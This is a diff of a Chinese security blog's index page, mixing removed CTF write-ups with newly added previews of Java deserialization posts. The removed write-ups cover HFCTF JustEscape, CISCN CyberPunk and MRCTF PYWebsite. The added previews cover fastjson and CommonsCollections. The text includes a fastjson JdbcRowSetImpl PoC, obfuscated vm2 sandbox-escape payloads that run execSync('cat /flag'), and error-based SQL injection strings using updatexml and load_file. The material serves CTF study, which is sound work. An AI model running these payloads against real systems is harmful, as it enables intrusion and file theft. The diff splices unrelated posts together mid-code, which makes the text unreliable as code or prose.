class="fa-fw fas fa-comment-dotso"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 关系</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://tva1.sinaimg.cn/large/008eGmZEly1gobclvtltbj31c00u0ahu.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">小叹</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-comment-dotso"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 关系</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">小叹</h1><div id="site_social_icons"><a class="social-icon" href="https://github.com/York145" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/2192557290@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/03/11/%E5%86%8D%E6%8E%A2fastjson/" title="再探fastjson">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="再探fastjson"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/11/%E5%86%8D%E6%8E%A2fastjson/" title="再探fastjson">再探fastjson</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-03-11T12:12:01.000Z" title="Created 2021-03-11 20:12:01">2021-03-11</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/java/">java</a></span></div><div class="content">再探fastjson实验环境
+java 8u112
+IDEA2020.3
+fastjsonfastjson 1.2.25-1.4.41
+
+import com.alibaba.fastjson.JSON;
+
+public class Main &#123;
+    public static void main(String[] args) &#123;
+        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;&quot;;
+        JSON.parse(PoC);
     &#125;
-&#125;+&#39;)()&#39;;try&#123;
-    console.log(new VM().run(untrusted));
-&#125;catch(x)&#123;
-    console.log(x);
-&#125;</code></pre>
-<p>但是反引号和${}已经被过滤掉了，</p>
-<pre><code class="javascript">(function ()&#123;
-    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)();
-    try&#123;
-        Object.preventExtensions(Buffer.from(``)).a = 1;
-    &#125;catch(e)&#123;
-        return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();
-    &#125;
-&#125;)()</code></pre>
-<p>第二种绕过是：使用join来拼接字符串</p>
-<pre><code class="javascript">(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); &#125; &#125;)()</code></pre>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/05/17/[HFCTF2020]JustEscape/" data-id="ckemqkeb2001gastyfaljh6ev" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-[XNUCA2019Qualifier]EasyPHP" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/05/13/%5BXNUCA2019Qualifier%5DEasyPHP/" class="article-date">
-  <time datetime="2020-05-13T09:24:38.721Z" itemprop="datePublished">2020-05-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><ul>
-<li>解法一<ul>
-<li>[1、error_log结合log_errors自定义错误日志]</li>
-<li>[2、include_path设置包含路径]</li>
-<li>[3、php_value zend.multibyte 1结合php_value zend.script_encoding “UTF-7”绕过尖括号&lt;过滤]</li>
-<li>[4、# \ 绕过.htaccess中多余字符]</li>
-</ul>
-</li>
-<li>解法二<ul>
-<li>[5、.htaccess配置prce绕过正则匹配]</li>
-</ul>
-</li>
-<li>[解法三]</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/05/13/[XNUCA2019Qualifier]EasyPHP/" data-id="ckemqkeb5001kasty28ar0fvn" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-[CISCN2019 华北赛区 Day1 Web5]CyberPunk" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/05/06/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5%5DCyberPunk/" class="article-date">
-  <time datetime="2020-05-06T15:05:46.236Z" itemprop="datePublished">2020-05-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200506210636892.png" alt="image-20200506210636892"></p>
-<p>发现敏感信息。</p>
-<p>利用PHP伪协议读取源码</p>
-<p><code>index.php：</code></p>
-<pre><code class="PHP">&lt;?php
-
-ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);
-
-// $file = $_GET[&quot;file&quot;];
-$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
-if (isset($file))&#123;
-    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123;
-        echo(&#39;no way!&#39;);
-        exit;
-    &#125;
-    @include($file);
 &#125;
-?&gt;</code></pre>
-<p>这里的正则因为是/i对大小写不敏感所以我没办法绕过。</p>
-<p>search.php</p>
-<pre><code>&lt;?php
+我们按照1.2.24的POC试试看。很显然失败了，并且返回了一个错误：autoType is not support。在Fas ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/03/08/fastjson%201.22-1.24%20Templateslmpl%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="fastjson 1.22-1.24 Templateslmpl漏洞复现与分析">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fastjson 1.22-1.24 Templateslmpl漏洞复现与分析"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/08/fastjson%201.22-1.24%20Templateslmpl%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="fastjson 1.22-1.24 Templateslmpl漏洞复现与分析">fastjson 1.22-1.24 Templateslmpl漏洞复现与分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-03-08T13:12:01.000Z" title="Created 2021-03-08 21:12:01">2021-03-08</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/java/">java</a></span></div><div class="content">fastjson 1.22-1.24 Templateslmpl漏洞复习与分析前言前几天复现了一下jdbcRowsetlmpl,今天来分析一下Templatelmpl。个人觉得Templatelmpl链比jdbcRowsetlmpl的要简单一些。
+复现import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
-require_once &quot;config.php&quot;; 
+import java.io.IOException;
 
-if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
-&#123;
-    $msg = &#39;&#39;;
-    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
-    $user_name = $_POST[&quot;user_name&quot;];
-    $phone = $_POST[&quot;phone&quot;];
-    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; 
-        $msg = &#39;no sql inject!&#39;;
-    &#125;else&#123;
-        $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;
-        $fetch = $db-&gt;query($sql);
-    &#125;
-
-    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;
-        $row = $fetch-&gt;fetch_assoc();
-        if(!$row) &#123;
-            echo &#39;error&#39;;
-            print_r($db-&gt;error);
-            exit;
-        &#125;
-        $msg = &quot;&lt;p&gt;å§å:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;
-    &#125; else &#123;
-        $msg = &quot;æªæ¾å°è®¢å!&quot;;
-    &#125;
-
-&#125;else &#123;
-    $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;
+public class TEMPOC e ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/03/07/fastjson1.2.22-1.2.24%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="fastjson1.2.22-1.2.24漏洞复现与分析">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fastjson1.2.22-1.2.24漏洞复现与分析"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/07/fastjson1.2.22-1.2.24%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="fastjson1.2.22-1.2.24漏洞复现与分析">fastjson1.2.22-1.2.24漏洞复现与分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-03-07T03:12:01.000Z" title="Created 2021-03-07 11:12:01">2021-03-07</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/java/">java</a></span></div><div class="content">基于Java反序列化-初识RMI，JRMP，JNDI前言QAQ，感觉自己啥也不会，要好好努力学习了。但是由于本人遗忘度很大，因此要记下来学习QAQ。
+概念RMI（Remote Method Invocation）Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。
+Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。
+乱七八糟的一大串，简单来说，RMI就是一个只java远程调用方法的行为。
+JRMP（Java Remote Method Protocol）Java远程方法协议（英语：Java Remote Method Protoco ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/03/03/CommonsCollections%201%E5%88%86%E6%9E%90/" title="CommonsCollections 1分析">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CommonsCollections 1分析"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/03/CommonsCollections%201%E5%88%86%E6%9E%90/" title="CommonsCollections 1分析">CommonsCollections 1分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-03-03T12:05:01.000Z" title="Created 2021-03-03 20:05:01">2021-03-03</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/Java/">Java</a></span></div><div class="content">CommonsCollections 1分析利用链ObjectInputStream.readObject()
+        AnnotationInvocationHandler.readObject()
+            Map(Proxy).entrySet()
+                AnnotationInvocationHandler.invoke()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod( ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/03/01/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7/" title="静态分析技巧">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="静态分析技巧"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/01/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7/" title="静态分析技巧">静态分析技巧</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-03-01T13:44:01.000Z" title="Created 2021-03-01 21:44:01">2021-03-01</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E9%80%86%E5%90%91/">逆向</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/%E9%80%86%E5%90%91/">逆向</a></span></div><div class="content">静态分析技巧这里总结了三个技巧，通过分析程序展示。最近学Java有点乏味看一点逆向.
+1首先运行程序，运行界面如下:我们先找一下字符串shift+F12:
+按x查找引用：
+我们按下F5:
+看见反编译之后和我们想象中的函数不一样，接下来我们回头看看汇编代码。在原来的代码中我们可以发现从401080到4010C8明明是一个函数，可是F5后确编译出错。我们先看到打印First这段汇编。
+我们可以很轻易的就辨认出sub_4010D0就是printf，这里IDA并没有辨认出printf那这是为什么呢，有人可能会认为这是我们导入签名文件导致的，但是事实上就算导入了签名文件，IDA还是无法辨认出printf。我们可以在VS2017中写一段代码来看看。我们可以发现在VS2017中，按下F12这里直接把printf的源码写进了代码中，所以就算导入签名文件IDA也无法辨认。
+我们回来再看看接下来的汇编：我们重点看看这几句汇编可以看见4010A8被赋值给了eax，而eax又赋值给了ebp+4，然后再jmp。其实显而易见这里就是一句jmp 4010A8，但是这会导致IDA反汇编错误我们更改了就行了，因为IDA ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/02/05/ysoserial%20-URLDNS%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="ysoserial -URLDNS的学习">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ysoserial -URLDNS的学习"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/02/05/ysoserial%20-URLDNS%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="ysoserial -URLDNS的学习">ysoserial -URLDNS的学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-02-05T07:45:01.000Z" title="Created 2021-02-05 15:45:01">2021-02-05</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/Java/">Java</a></span></div><div class="content">ysoserial -URLDNS的学习好久没碰Java了忘记的差不多了来重新复习一下。
+在本地搭建ysoserial的时候报错报了一堆，解决了好久都没解决，最后多亏了天下大木头爷爷才解决，这可能就是我菜的原因吧QAQ（Java的版本别弄太高）。
+版本：java 1.8
+先看看作者的说明
+*   The Java URL class has an interesting property on its equals and
+*   hashCode methods. The URL class will, as a side effect, do a DNS lookup
+*   during a comparison (either equals or hashCode).
+*
+*   As part of deserialization, HashMap calls hashCode on each key that it
+*   deserializes, so using a Java URL object as a serialized key allows
+*   it t ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/11/12/shellcode%E7%BC%96%E5%86%99%E5%8E%9F%E5%88%99/" title="shellcode编写原则">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="shellcode编写原则"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/12/shellcode%E7%BC%96%E5%86%99%E5%8E%9F%E5%88%99/" title="shellcode编写原则">shellcode编写原则</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2020-11-12T09:09:01.000Z" title="Created 2020-11-12 17:09:01">2020-11-12</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/web/">web</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/web/">web</a></span></div><div class="content">shellcode编写原则杜绝绝对地址的绝对调用
+VS开发平台中，双引号字符串会被编译到只读数据段，以引用绝对地址的方式使用。而在shellcode编程中，要尽量避免一切绝对地址的使用。
+char Data[] = &quot;xxxx&quot; [×]char *Data = &quot;xxx&quot;[×]sprintf(Data,&quot;%s%d&quot;,....)[×]memcpy(Data, &quot;xxxx&quot;) [×]
+char Data[] = &#123;&#39;x&#39;,&#39;x&#39;,&#39;x&#39;&#125; [√]
+__asm&#123;    _EMIT &#39;x&#39;    _EMIT &#39;x&#39;               [√]    _EMIT &#39;x&#39;    _EMIT 0
 &#125;
-?&gt;</code></pre><p>index.php中无法实现绕过，考虑使用二次注入。</p>
-<p>会发现查询页面会有回显，修改页面存在报错。通过查询页面可以知道，只有地址存在’。</p>
-<blockquote>
-<p>1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)<em>#</em></p>
-</blockquote>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200506224723491.png" alt="image-20200506224723491"></p>
-<p>利用load_file读取flag.txt</p>
-<blockquote>
-<p>errorXPATH syntax error: ‘~flag{8fbc88cb-5172-4418-b655-f6’</p>
-</blockquote>
-<p>发现显示的不完整。</p>
-<blockquote>
-<p>1’ and updatexml(1,concat(0x7e,(select right(load_file(‘/flag.txt’),20)),0x7e),1)#</p>
-</blockquote>
-<blockquote>
-<p>errorXPATH syntax error: ‘~-b655-f6bb7aabe0fc} ~’</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/05/06/[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk/" data-id="ckemqkeay0019astyfdlvdbhe" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
+函数的动态调用
+编译器实际上是把我们调用的MessageBox转换成系统中真正执行弹框功能的函数的入口地址。把MessageBox转换成实际地址的过程实际上是在vs编译器生成EXE的 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/10/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%E4%B8%8A/" title="红日靶场练习（一）上">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场练习（一）上"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/10/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%E4%B8%8A/" title="红日靶场练习（一）上">红日靶场练习（一）上</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2020-10-06T09:58:01.000Z" title="Created 2020-10-06 17:58:01">2020-10-06</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a></span></div><div class="content">红日靶场练习（一）上测试连通性a)Win7与攻击机及两太内网主机连通性
+win7:192.168.52.143  192.168.140.130
+win2k3:192.168.52.141
+windows server:192.168.52.138
 
 
-  
-    <article id="post-[MRCTF2020]PYWebsite" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/05/05/%5BMRCTF2020%5DPYWebsite/" class="article-date">
-  <time datetime="2020-05-05T11:17:34.924Z" itemprop="datePublished">2020-05-05</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>F12发现了</p>
-<blockquote>
-<p>/js/md5.js</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>function enc(code){</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td>hash = hex_md5(code);</td>
-</tr>
-<tr>
-<td></td>
-<td>return hash;</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>function validate(){</td>
-</tr>
-<tr>
-<td></td>
-<td>var code = document.getElementById(“vcode”).value;</td>
-</tr>
-<tr>
-<td></td>
-<td>if (code != “”){</td>
-</tr>
-<tr>
-<td></td>
-<td>if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”){</td>
-</tr>
-<tr>
-<td></td>
-<td>alert(“您通过了验证！”);</td>
-</tr>
-<tr>
-<td></td>
-<td>window.location = “./flag.php”</td>
-</tr>
-<tr>
-<td></td>
-<td>}else{</td>
-</tr>
-<tr>
-<td></td>
-<td>alert(“你的授权码不正确！”);</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>}else{</td>
-</tr>
-<tr>
-<td></td>
-<td>alert(“请输入授权码”);</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-</tbody></table>
-<p>说输入code与某值进行比较，相等就出现flag。所以现在就是分析加密函数。</p>
-<blockquote>
-<p> if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”)</p>
-</blockquote>
-<blockquote>
-<pre><code>function hex_md5(s)&#123; return binl2hex(core_md5(str2binl(s), s.length * 8));&#125;</code></pre></blockquote>
-<p>可以看到hex_md5就是通过core_md5加密str2bin1加密后的code先去看看strbin函数</p>
-<pre><code>function str2binl(str)
-&#123;
-  var bin = Array();
-  var mask = (1 &lt;&lt; 8) - 1;//mask=255
-  for(var i = 0; i &lt; str.length * 8; i += 8)
-    bin[i&gt;&gt;5] |= (str.charCodeAt(i / chrsz) &amp; mask) &lt;&lt; (i%32);
-  return bin;
-&#125;</code></pre><p>额，算了好麻烦。。。换个思路直接读取flag.php(强行狡辩，其实我忘记可以直接读取的了)</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200505180527740.png" alt="image-20200505180527740"></p>
-<p>xff绕过。</p>
-<p>flag{abd61860-ad51-41aa-8a19-6d7c43cbac68}</p>
+b)Win2K3与WinSever 2008 R2及Win7连通性
 
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/05/05/[MRCTF2020]PYWebsite/" data-id="ckemqkeb3001hastyh3s7261u" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
+c)WinSever 2008 R2与 Win2K3及Win7连通性
+d)Kali攻击机与web服务器连通性
+
+在Win7主机上开启phpstuday，使用kali攻击机访问
+
+信息收集
+1.先使用namp扫主机
+
+2.利用御剑扫目录
+一：备份文件中是yxcms，访问一下。
+
+进入后台。
 
 
-  
-    <article id="post-[GYCTF2020]FlaskApp" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/05/03/%5BGYCTF2020%5DFlaskApp/" class="article-date">
-  <time datetime="2020-05-03T10:48:01.753Z" itemprop="datePublished">2020-05-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>在提示页面f12发现了一段神奇的cookie</p>
-<blockquote>
-<p>eyJjc3JmX3Rva2VuIjoiOTAzM2UwYTY2YzhhOTM3N2NjYmNlMTIwNDcyZmZkYWVhMTg3YTljNyJ9.Xq5hWQ.wd9G8fR8lwO4P_W-GS9Dxbp70kQ</p>
-</blockquote>
-<p>在网站的解密页面解密一下。突然就跳转到了一个神奇的页面</p>
